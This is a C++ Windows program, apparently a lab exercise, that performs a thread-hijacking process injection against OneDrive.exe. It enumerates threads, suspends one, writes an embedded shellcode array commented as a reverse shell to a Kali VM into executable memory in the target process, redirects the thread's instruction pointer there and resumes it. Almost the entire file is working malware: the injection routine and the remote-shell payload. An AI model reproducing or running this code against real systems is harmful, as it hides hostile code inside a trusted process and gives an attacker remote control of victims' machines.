/*
    Thread hijacking attack on the process OneDrive.exe
*/


#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <memory>

#define NO_PROCID 0
#define NO_INHERIT FALSE
#define THREAD_RWS_ACCESS (THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME)
#define RANDOM_ADDR NULL
#define NUM_OF_BYTES NULL


// Reverse Shell to Kali VM
const unsigned char SHELLCODE[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
    0x52, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x51, 0x56, 0x48, 0x8b, 0x52,
    0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48,
    0x8b, 0x72, 0x50, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41,
    0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x48, 0x8b, 0x52, 0x20, 0x41,
    0x51, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f,
    0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
    0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
    0x01, 0xd0, 0xe3, 0x56, 0x4d, 0x31, 0xc9, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88,
    0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8,
    0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
    0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58, 0x41, 0x58,
    0x5e, 0x59, 0x48, 0x01, 0xd0, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83,
    0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
    0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00,
    0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49,
    0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x13, 0x80, 0x41, 0x54,
    0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5,
    0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b,
    0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31,
    0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41,
    0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58,
    0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5,
    0x85, 0xc0, 0x74, 0x0c, 0x49, 0xff, 0xce, 0x75, 0xe5, 0x68, 0xf0, 0xb5, 0xa2, 0x56,
    0xff, 0xd5, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9, 0x6a, 0x04,
    0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x48,
    0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x81, 0xf6, 0xa0, 0x05, 0xa2, 0xd3, 0x4c, 0x8d,
    0x9e, 0x00, 0x01, 0x00, 0x00, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00,
    0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5,
    0xff, 0xd5, 0x48, 0x8d, 0x98, 0x00, 0x01, 0x00, 0x00, 0x49, 0x89, 0xdf, 0x53, 0x56,
    0x50, 0x4d, 0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41,
    0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x48, 0x01, 0xc3,
    0x48, 0x29, 0xc6, 0x75, 0xe0, 0x49, 0x89, 0xfe, 0x5f, 0x59, 0x41, 0x59, 0x41, 0x56,
    0xe8, 0x10, 0x00, 0x00, 0x00, 0x34, 0x2a, 0x68, 0x7e, 0xa2, 0xd0, 0x53, 0x60, 0xc9,
    0x53, 0x10, 0x7a, 0xcb, 0xe8, 0x3e, 0x08, 0x5e, 0x48, 0x31, 0xc0, 0x49, 0x89, 0xf8,
    0xaa, 0xfe, 0xc0, 0x75, 0xfb, 0x48, 0x31, 0xdb, 0x41, 0x02, 0x1c, 0x00, 0x48, 0x89,
    0xc2, 0x80, 0xe2, 0x0f, 0x02, 0x1c, 0x16, 0x41, 0x8a, 0x14, 0x00, 0x41, 0x86, 0x14,
    0x18, 0x41, 0x88, 0x14, 0x00, 0xfe, 0xc0, 0x75, 0xe3, 0x48, 0x31, 0xdb, 0xfe, 0xc0,
    0x41, 0x02, 0x1c, 0x00, 0x41, 0x8a, 0x14, 0x00, 0x41, 0x86, 0x14, 0x18, 0x41, 0x88,
    0x14, 0x00, 0x41, 0x02, 0x14, 0x18, 0x41, 0x8a, 0x14, 0x10, 0x41, 0x30, 0x11, 0x49,
    0xff, 0xc1, 0x48, 0xff, 0xc9, 0x75, 0xdb, 0x5f, 0x41, 0xff, 0xe7
};


using AutoHandle = std::unique_ptr<std::remove_pointer<HANDLE>::type, decltype(&CloseHandle)>;

const std::wstring ONEDRIVE = L"OneDrive.exe";
constexpr DWORD INVALID_HANDLE = (DWORD)-1;


// Returning ProcessEntry32 Structure of OneDrive.exe
PROCESSENTRY32 getPE() {
    AutoHandle hProcesses(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NO_PROCID), CloseHandle);
    if (INVALID_HANDLE_VALUE == hProcesses.get()) {
        std::cerr << "Failed to take processes snapshot " << GetLastError() << std::endl;
        return {};
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcesses.get(), &pe32)) {
        std::cerr << "Failed to get the first process " << GetLastError() << std::endl;
        return {};
    }

    do
    {
        if (ONEDRIVE == pe32.szExeFile) {
            return pe32;
        }

    } while (Process32Next(hProcesses.get(), &pe32));
    return {};
}


int main() {

    PROCESSENTRY32 pe32;
    pe32 = getPE();

    if (0 == pe32.dwSize) {
        std::cerr << "Target process not found " << std::endl;
        return 1;
    }

    AutoHandle hThreads(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NO_PROCID), CloseHandle);
    if (INVALID_HANDLE_VALUE == hThreads.get()) {
        std::cerr << "Failed to take threads snapshot " << GetLastError() << std::endl;
        return 1;
    }

    THREADENTRY32 th32;
    th32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hThreads.get(), &th32)) {
        std::cerr << "Failed to get the first thread " << GetLastError() << std::endl;
        return 1;
    }

    // Looping all the threads in the system
    do
    {
        // Skiping if its not the process's thread
        if (!(th32.th32OwnerProcessID == pe32.th32ProcessID)) {
            continue;
        }
        
        AutoHandle hThread(OpenThread(THREAD_RWS_ACCESS, NO_INHERIT, th32.th32ThreadID), CloseHandle);
        if (NULL == hThread) {
            std::cerr << "Failed to open the thread" << GetLastError() << std::endl;
            return 1;
        }

        if (INVALID_HANDLE == SuspendThread(hThread.get())) {
            std::cerr << "Failed to suspend the thread " << GetLastError() << std::endl;
            return 1;
        }

        AutoHandle hProc(OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, NO_INHERIT, pe32.th32ProcessID), CloseHandle);
        if (NULL == hProc.get()) {
            std::cerr << "Failed to open handle to the process " << GetLastError() << std::endl;
            return 1;
        }

        LPVOID addr = VirtualAllocEx(hProc.get(), RANDOM_ADDR, sizeof(SHELLCODE), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (NULL == addr) {
            std::cerr << "Failed to allocate memory " << GetLastError() << std::endl;
            return 1;
        }

        if (!(WriteProcessMemory(hProc.get(), addr, SHELLCODE, sizeof(SHELLCODE), NUM_OF_BYTES))) {
            std::cerr << "Failed to write shellcode " << GetLastError() << std::endl;
            return 1;
        }

        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_FULL;

        if (!GetThreadContext(hThread.get(), &ctx)) {
            std::cerr << "Failed to get the context of the thread " << GetLastError() << std::endl;
            return 1;
        }

        ctx.Rip = (DWORD_PTR)addr;

        if (!SetThreadContext(hThread.get(), &ctx)) {
            std::cerr << "Failed to set the context of the thread " << GetLastError() << std::endl;
            return 1;
        }

        if (INVALID_HANDLE == ResumeThread(hThread.get())) {
            std::cerr << "Failed to resume the thread " << GetLastError() << std::endl;
            return 1;
        }
        return 0;

    } while (Thread32Next(hThreads.get(), &th32));

    return 0;
}